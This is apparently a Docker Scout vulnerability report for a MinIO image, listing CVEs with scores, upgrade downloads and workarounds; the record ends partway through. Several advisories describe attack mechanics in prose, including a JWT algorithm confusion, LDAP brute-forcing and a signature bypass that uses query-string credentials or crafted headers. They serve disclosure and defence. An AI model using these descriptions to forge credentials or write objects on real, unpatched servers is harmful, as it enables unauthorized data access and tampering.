---
hide_table_of_contents: true
---

<table>
<tr><td>digest</td><td><code>sha256:39bdec027d5dcd849cf78bda1c13fb09feb3f43cd46bddd8d3dd9fe21f0edbea</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 2" src="https://img.shields.io/badge/critical-2-8b1924"/> <img alt="high: 8" src="https://img.shields.io/badge/high-8-e25d68"/> <img alt="medium: 9" src="https://img.shields.io/badge/medium-9-fbb552"/> <img alt="low: 93" src="https://img.shields.io/badge/low-93-fce1a9"/> <img alt="unspecified: 5" src="https://img.shields.io/badge/unspecified-5-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>92 MB</td></tr>
<tr><td>packages</td><td>372</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 2" src="https://img.shields.io/badge/C-2-8b1924"/> <img alt="high: 5" src="https://img.shields.io/badge/H-5-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/minio/minio</strong> <code>0.0.0-20251015172955-9e49d5e7a648+dirty</code> (golang)</summary>

<small><code>pkg:golang/github.com/minio/minio@0.0.0-20251015172955-9e49d5e7a648%2Bdirty</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-33322?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3C%3D0.0.0-20260212201848-7aac2a2c5b7c"><img alt="critical 9.2: CVE--2026--33322" src="https://img.shields.io/badge/CVE--2026--33322-lightgrey?label=critical%209.2&labelColor=8b1924"/></a> <i>Improper Authentication</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=0.0.0-20260212201848-7aac2a2c5b7c</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.704%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
_What kind of vulnerability is it? Who is impacted?_

A JWT algorithm confusion vulnerability in MinIO's OpenID Connect authentication allows an attacker who knows the OIDC `ClientSecret` to forge arbitrary identity tokens and obtain S3 credentials with any policy, including `consoleAdmin`.

An attacker with knowledge of the OIDC `ClientSecret` can:

- Impersonate any user identity
- Obtain S3 credentials with any IAM policy, including `consoleAdmin`
- Access, modify, or delete any data in the MinIO deployment

The attack is deterministic (100% success rate, no race conditions).

#### Attack Prerequisites

The attacker must know the OIDC `ClientSecret`. While this is a shared credential (not a private key), it is more accessible than commonly assumed:

- CVE-2023-28432 previously leaked environment variables including `MINIO_IDENTITY_OPENID_CLIENT_SECRET`
- Client secrets are often present in frontend OAuth configurations, mobile app bundles, CI/CD pipelines, and shared configuration files
- In many organizations, the client secret is accessible to operators and engineers who should not be able to forge arbitrary identities


#### Affected Versions

All MinIO releases from `RELEASE.2022-11-08T05-27-07Z` through the final release of the `minio/minio` open-source project.

### Patches

**Fixed in:** MinIO AIStor `RELEASE.2026-03-17T21-25-16Z`

## Downloads

### Binary Downloads

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio)           |
| Linux    | arm64        | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio)           |
| macOS    | arm64        | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio)          |
| macOS    | amd64        | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio)          |
| Windows  | amd64        | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

### FIPS Binaries

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux    | arm64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

### Package Downloads

| Format | Architecture | Download                                                                                                                            |
| ------ | ------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| DEB    | amd64        | [minio_20260317212516.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20260317212516.0.0_amd64.deb)         |
| DEB    | arm64        | [minio_20260317212516.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20260317212516.0.0_arm64.deb)         |
| RPM    | amd64        | [minio-20260317212516.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20260317212516.0.0-1.x86_64.rpm)   |
| RPM    | arm64        | [minio-20260317212516.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20260317212516.0.0-1.aarch64.rpm) |

### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z
podman pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z.fips
```

### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```

### Workarounds

- [Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2026-03-17T21-25-16Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)
- As a workaround, ensure that the OIDC `ClientSecret` is treated as a highly sensitive credential and is not exposed to untrusted parties.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33419?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3C%3D0.0.0-20260212201848-7aac2a2c5b7c"><img alt="critical 9.1: CVE--2026--33419" src="https://img.shields.io/badge/CVE--2026--33419-lightgrey?label=critical%209.1&labelColor=8b1924"/></a> <i>Observable Response Discrepancy</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=0.0.0-20260212201848-7aac2a2c5b7c</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.633%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
_What kind of vulnerability is it? Who is impacted?_

MinIO AIStor's STS (Security Token Service) `AssumeRoleWithLDAPIdentity` endpoint is vulnerable to LDAP credential brute-forcing due to two combined weaknesses: (1) distinguishable error responses that enable username enumeration, and (2) absence of rate limiting on authentication attempts. An unauthenticated network attacker can enumerate valid LDAP usernames and then perform unlimited password guessing to obtain temporary AWS-style STS credentials, gaining access to the victim's S3 buckets and objects.

All deployments with LDAP configured running an affected version are impacted.

There are two vulnerabilities:

1. User Enumeration via Distinguishable Error Messages (CWE-204)
2. Missing Rate Limiting on STS Authentication Endpoints (CWE-307)

When exploited together, an attacker can:

1. Enumerate valid LDAP usernames by observing error message differences.
3. Perform high-speed password brute-force attacks against confirmed valid users.
4. Upon finding valid credentials, obtain temporary AWS-style STS credentials (`AccessKeyId`, `SecretAccessKey`, `SessionToken`) with full access to the victim user's S3 resources.

### Affected Versions

All MinIO releases through the final release of the minio/minio open-source project.

### Patches

**Fixed in**: MinIO AIStor RELEASE.2026-03-17T21-25-16Z

#### Binary Downloads

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio)           |
| Linux    | arm64        | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio)           |
| macOS    | arm64        | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio)          |
| macOS    | amd64        | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio)          |
| Windows  | amd64        | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

#### FIPS Binaries

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux    | arm64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

#### Package Downloads

| Format | Architecture | Download                                                                                                                            |
| ------ | ------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| DEB    | amd64        | [minio_20260317212516.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20260317212516.0.0_amd64.deb)         |
| DEB    | arm64        | [minio_20260317212516.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20260317212516.0.0_arm64.deb)         |
| RPM    | amd64        | [minio-20260317212516.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20260317212516.0.0-1.x86_64.rpm)   |
| RPM    | arm64        | [minio-20260317212516.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20260317212516.0.0-1.aarch64.rpm) |

#### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z
podman pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2026-03-17T21-25-16Z.fips
```

#### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```
 

### Workarounds

- [Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2026-03-17T21-25-16Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)

If upgrading is not immediately possible:

- **Network-level rate limiting**: Use a reverse proxy (e.g., nginx, HAProxy) or WAF to rate-limit requests to the `/?Action=AssumeRoleWithLDAPIdentity` endpoint.
- **Firewall restrictions**: Restrict access to the STS endpoint to trusted networks/IP ranges only.
- **LDAP account lockout**: Configure account lockout policies on the LDAP server itself (e.g., Active Directory lockout threshold). Note: this protects against brute-force but not enumeration, and may cause denial-of-service for legitimate users.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-41145?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3E%3D0.0.0-20230506025312-76913a9fd5c6%2C%3C%3D0.0.0-20260212201848-7aac2a2c5b7c"><img alt="high 8.8: CVE--2026--41145" src="https://img.shields.io/badge/CVE--2026--41145-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Authentication</i>

<table>
<tr><td>Affected range</td><td><code>>=0.0.0-20230506025312-76913a9fd5c6<br/><=0.0.0-20260212201848-7aac2a2c5b7c</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.621%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

_What kind of vulnerability is it? Who is impacted?_

An authentication bypass vulnerability in MinIO's `STREAMING-UNSIGNED-PAYLOAD-TRAILER` code path
allows any user who knows a valid access key to write arbitrary objects to any bucket without knowing
the secret key or providing a valid cryptographic signature.

Any MinIO deployment is impacted. The attack requires only a valid access key (the well-known default
`minioadmin`, or any key with WRITE permission on a bucket) and a target bucket name.

`PutObjectHandler` and `PutObjectPartHandler` call `newUnsignedV4ChunkedReader` with a signature
verification gate based solely on the presence of the `Authorization` header:

```go
newUnsignedV4ChunkedReader(r, true, r.Header.Get(xhttp.Authorization) != "")
```

Meanwhile, `isPutActionAllowed` extracts credentials from either the `Authorization` header or the
`X-Amz-Credential` query parameter, and trusts whichever it finds. An attacker omits the
`Authorization` header and supplies credentials exclusively via the query string. The signature gate
evaluates to `false`, `doesSignatureMatch` is never called, and the request proceeds with the
permissions of the impersonated access key.

This affects `PutObjectHandler` (standard and tables/warehouse bucket paths) and
`PutObjectPartHandler` (multipart uploads).

**Affected components:** `cmd/object-handlers.go` (`PutObjectHandler`),
`cmd/object-multipart-handlers.go` (`PutObjectPartHandler`).

### Affected Versions

All MinIO releases through the final release of the minio/minio open-source project.

The vulnerability was introduced in commit
[`76913a9fd`](https://github.com/minio/minio/commit/76913a9fd5c6e5c2dbd4e8c7faf56ed9e9e24091)
("Signed trailers for signature v4", [PR #16484](https://github.com/minio/minio/pull/16484)),
which added `authTypeStreamingUnsignedTrailer` support. The first affected release is
`RELEASE.2023-05-18T00-05-36Z`.

### Patches

**Fixed in**: MinIO AIStor RELEASE.2026-04-11T03-20-12Z

#### Binary Downloads

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio)           |
| Linux    | arm64        | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio)           |
| macOS    | arm64        | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio)          |
| macOS    | amd64        | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio)          |
| Windows  | amd64        | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

#### FIPS Binaries

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux    | arm64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

#### Package Downloads

| Format | Architecture | Download                                                                                                                            |
| ------ | ------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| DEB    | amd64        | [minio_20260411032012.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20260411032012.0.0_amd64.deb)         |
| DEB    | arm64        | [minio_20260411032012.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20260411032012.0.0_arm64.deb)         |
| RPM    | amd64        | [minio-20260411032012.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20260411032012.0.0-1.x86_64.rpm)   |
| RPM    | arm64        | [minio-20260411032012.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20260411032012.0.0-1.aarch64.rpm) |

#### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z
podman pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z.fips
```

#### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```

### Workarounds

- [Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2026-04-11T03-20-12Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)

If upgrading is not immediately possible:

- **Block unsigned-trailer requests at the load balancer.** Reject any request containing
  `X-Amz-Content-Sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER` at the reverse proxy or WAF layer.
  Clients can use `STREAMING-AWS4-HMAC-SHA256-PAYLOAD-TRAILER` (the signed variant) instead.

- **Restrict WRITE permissions.** Limit `s3:PutObject` grants to trusted principals. While this
  reduces the attack surface, it does not eliminate the vulnerability since any user with WRITE
  permission can exploit it with only their access key.

### Credits

- **Finder:** Arvin Shivram of Brutecat Security ([@<!-- -->ddd](https://github.com/ddd))

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-40344?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3E%3D0.0.0-20230506025312-76913a9fd5c6%2C%3C%3D0.0.0-20260212201848-7aac2a2c5b7c"><img alt="high 8.8: CVE--2026--40344" src="https://img.shields.io/badge/CVE--2026--40344-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Authentication</i>

<table>
<tr><td>Affected range</td><td><code>>=0.0.0-20230506025312-76913a9fd5c6<br/><=0.0.0-20260212201848-7aac2a2c5b7c</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.743%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Two authentication bypass vulnerabilities in MinIO's `STREAMING-UNSIGNED-PAYLOAD-TRAILER` code path
allow any user who knows a valid access key to write arbitrary objects to any bucket without knowing
the secret key or providing a valid cryptographic signature.

Any MinIO deployment is impacted. The attack requires only a valid access key (the well-known default
`minioadmin`, or any key with WRITE permission on a bucket) and a target bucket name.

There are two vulnerabilities:

1. Missing Signature Verification in PutObjectExtractHandler / Snowball (CWE-306)
2. Signature Verification Bypass via Query-String Credentials (CWE-287)

**Vulnerability 1 — Missing signature verification in PutObjectExtractHandler (Snowball)**

When `authTypeStreamingUnsignedTrailer` support was added (commit 76913a9fd, PR #16484), the new auth
type was handled in `PutObjectHandler` and `PutObjectPartHandler` but was never added to
`PutObjectExtractHandler`. The snowball auto-extract handler's `switch rAuthType` block has no case for
`authTypeStreamingUnsignedTrailer`, so execution falls through with zero signature verification. The
`isPutActionAllowed` call before the switch extracts the access key and checks IAM permissions, but
does not verify the cryptographic signature.

An attacker sends a PUT request with `X-Amz-Content-Sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER`,
`X-Amz-Meta-Snowball-Auto-Extract: true`, and an `Authorization` header containing a valid access key
with a completely fabricated signature. The request is accepted and the tar payload is extracted into
the bucket.

**Affected component:** `cmd/object-handlers.go`, function `PutObjectExtractHandler`.

**Vulnerability 2 — Signature verification bypass via query-string credentials**

`PutObjectHandler` and `PutObjectPartHandler` call `newUnsignedV4ChunkedReader` with a signature
verification gate based solely on the presence of the `Authorization` header:

```go
newUnsignedV4ChunkedReader(r, true, r.Header.Get(xhttp.Authorization) != "")
```

Meanwhile, `isPutActionAllowed` extracts credentials from either the `Authorization` header or the
`X-Amz-Credential` query parameter, and trusts whichever it finds. An attacker omits the
`Authorization` header and supplies credentials exclusively via the query string. The signature gate
evaluates to `false`, `doesSignatureMatch` is never called, and the request proceeds with the
permissions of the impersonated access key.

**Affected components:** `cmd/object-handlers.go` (`PutObjectHandler`),
`cmd/object-multipart-handlers.go` (`PutObjectPartHandler`).

**CVSS v4.0 Score:** 8.8 (High)

**Vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N`

**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-287 (Improper Authentication)

### Affected Versions

All MinIO releases through the final release of the minio/minio open-source project.

Both vulnerabilities were introduced in commit
[`76913a9fd`](https://github.com/minio/minio/commit/76913a9fd5c6e5c2dbd4e8c7faf56ed9e9e24091)
("Signed trailers for signature v4", [PR #16484](https://github.com/minio/minio/pull/16484)),
which added `authTypeStreamingUnsignedTrailer` support. The first affected release is
`RELEASE.2023-05-18T00-05-36Z`.

### Patches

**Fixed in**: MinIO AIStor RELEASE.2026-04-11T03-20-12Z

#### Binary Downloads

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio)           |
| Linux    | arm64        | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio)           |
| macOS    | arm64        | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio)          |
| macOS    | amd64        | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio)          |
| Windows  | amd64        | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

#### FIPS Binaries

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux    | arm64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

#### Package Downloads

| Format | Architecture | Download                                                                                                                            |
| ------ | ------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| DEB    | amd64        | [minio_20260411032012.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20260411032012.0.0_amd64.deb)         |
| DEB    | arm64        | [minio_20260411032012.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20260411032012.0.0_arm64.deb)         |
| RPM    | amd64        | [minio-20260411032012.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20260411032012.0.0-1.x86_64.rpm)   |
| RPM    | arm64        | [minio-20260411032012.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20260411032012.0.0-1.aarch64.rpm) |

#### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z
podman pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2026-04-11T03-20-12Z.fips
```

#### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```

### Workarounds

- [Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2026-04-11T03-20-12Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)

If upgrading is not immediately possible:

- **Block unsigned-trailer requests at the load balancer.** Reject any request containing
  `X-Amz-Content-Sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER` at the reverse proxy or WAF layer.
  Clients can use `STREAMING-AWS4-HMAC-SHA256-PAYLOAD-TRAILER` (the signed variant) instead.

- **Restrict WRITE permissions.** Limit `s3:PutObject` grants to trusted principals. While this
  reduces the attack surface, it does not eliminate the vulnerability since any user with WRITE
  permission can exploit it with only their access key.

### Credits

- **Finder:** Arvin Shivram of Brutecat Security ([@<!-- -->ddd](https://github.com/ddd))

### References

- Introducing commit: [`76913a9fd`](https://github.com/minio/minio/commit/76913a9fd5c6e5c2dbd4e8c7faf56ed9e9e24091) ([PR #16484](https://github.com/minio/minio/pull/16484))
- [MinIO AIStor](https://min.io/aistor)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-1000538?s=gitlab&n=minio&ns=github.com%2Fminio&t=golang&vr=%3Cv2018.05.16"><img alt="high 7.5: CVE--2018--1000538" src="https://img.shields.io/badge/CVE--2018--1000538-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>&lt;v2018.05.16</code></td></tr>
<tr><td>Fixed version</td><td><code>v2018.05.16</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.485%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Minio a Allocation of Memory Without Limits or Throttling vulnerability in write-to-RAM.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39414?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3E%3D0.0.0-20180815103019-7c14cdb60e53"><img alt="high 7.1: CVE--2026--39414" src="https://img.shields.io/badge/CVE--2026--39414-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>>=0.0.0-20180815103019-7c14cdb60e53</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.595%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

_What kind of vulnerability is it? Who is impacted?_

MinIO's S3 Select feature is vulnerable to memory exhaustion when processing CSV 
files containing lines longer than available memory. The CSV reader's `nextSplit()` 
function calls `bufio.Reader.ReadBytes('\n')` with no size limit, buffering the entire 
input in memory until a newline is found. A CSV file with no newline characters 
causes the entire contents to be read into a single allocation, leading to an OOM
crash of the MinIO server process.

This is exploitable by any authenticated user with `s3:PutObject` and `s3:GetObject` 
permissions. The attack is especially practical when combined with compression: 
a ~2 MB gzip-compressed CSV can decompress to gigabytes of data without 
newlines, allowing a small upload to cause large memory consumption on 
the server. However, compression is not required — a sufficiently large uncompressed 
CSV with no newlines triggers the same issue.

**Affected component:** `internal/s3select/csv/reader.go`, function
`nextSplit()`.

**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

### Affected Versions

All MinIO releases are through the final release of the minio/minio open-source project.

The vulnerability was introduced in commit https://github.com/minio/minio/commit/7c14cdb60e53dbfdad2be644dfb180cab19fffa7, which added S3 Select support for CSV. 
The CSV reader has used unbounded line reads since this commit (originally via 
Go's stdlib `encoding/csv.Reader`, later via `bufio.Reader.ReadBytes` after a refactor 
in [PR #8200](https://github.com/minio/minio/pull/8200). 

The first affected release is `RELEASE.2018-08-18T03-49-57Z`.

### Patches

**Fixed in**: MinIO AIStor RELEASE.2025-12-20T04-58-37Z

The fix replaces the unbounded `bufio.Reader.ReadBytes('\n')` call with a
byte-at-a-time loop that caps line scanning at 128 KB (`csvSplitSize`). If no
newline is found within this limit, the reader returns an error instead of
continuing to buffer.

#### Binary Downloads

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio)           |
| Linux    | arm64        | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio)           |
| macOS    | arm64        | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio)          |
| macOS    | amd64        | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio)          |
| Windows  | amd64        | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

#### FIPS Binaries

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux    | arm64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

#### Package Downloads

| Format | Architecture | Download                                                                                                                            |
| ------ | ------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| DEB    | amd64        | [minio_20251220045837.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20251220045837.0.0_amd64.deb)         |
| DEB    | arm64        | [minio_20251220045837.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20251220045837.0.0_arm64.deb)         |
| RPM    | amd64        | [minio-20251220045837.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20251220045837.0.0-1.x86_64.rpm)   |
| RPM    | arm64        | [minio-20251220045837.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20251220045837.0.0-1.aarch64.rpm) |

#### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2025-12-20T04-58-37Z
podman pull quay.io/minio/aistor/minio:RELEASE.2025-12-20T04-58-37Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2025-12-20T04-58-37Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2025-12-20T04-58-37Z.fips
```

#### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```

### Workarounds

- [Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2025-12-20T04-58-37Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)

If upgrading is not immediately possible:

- **Disable S3 Select access via IAM policy.** Deny the `s3:GetObject` action
  with a condition restricting `s3:prefix` on sensitive buckets, or more
  specifically, deny `SelectObjectContent` requests at a reverse proxy by
  blocking `POST` requests with `?select&select-type=2` query parameters.

- **Restrict PutObject permissions.** Limit `s3:PutObject` grants to trusted
  principals to reduce the attack surface. Note: this reduces risk but does not
  eliminate the vulnerability since any authorized user can exploit it.

### References

- Introducing commit: [`7c14cdb60`](https://github.com/minio/minio/commit/7c14cdb60e53dbfdad2be644dfb180cab19fffa7) ([PR #6127](https://github.com/minio/minio/pull/6127))
